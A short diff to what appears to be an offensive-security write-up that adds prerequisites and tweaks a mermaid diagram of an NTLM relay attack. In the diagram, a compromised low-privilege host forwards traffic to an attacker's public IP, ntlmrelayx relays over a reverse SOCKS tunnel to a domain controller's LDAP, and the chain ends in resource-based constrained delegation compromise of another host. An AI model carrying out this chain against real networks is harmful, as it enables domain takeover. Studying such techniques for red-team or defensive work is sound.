@@ -50,6 +50,10 @@ The diagram visualizes how we weaponize SOCKS proxy access into a full NTLM rela
 
 ### Flow
 
+**Prerequisites**
+1. HOSTA -> Reverse SOCKS connection to ATTACKER.
+2. Attacker -> sent relay package received back to HOSTA network, through HOSTA NIC. 
+
 ```mermaid
 graph TD
     %% Attack flow
@@ -57,7 +61,7 @@ graph TD
     B --> C[HOSTA:8888<br/>Low Priv Access<br/>TCPipe 8888 attackerip 80]
     C --> D[TCP Forwarder<br/>Port 8888]
     D --> E[publicattckerip:80<br/>Root Owned VM<br/>ntlmrelayx.py listener]
-    E --> F[ntlmrelayx<br/>Relay Service<br/>]
+    E --> F[ntlmrelayx<br/>Relay Service<br/>over SOCKS]
     F --> G[Domain Controller<br/>LDAP/LDAPS]
     G --> H[RBCD Compromise<br/>on HOSTB]
 
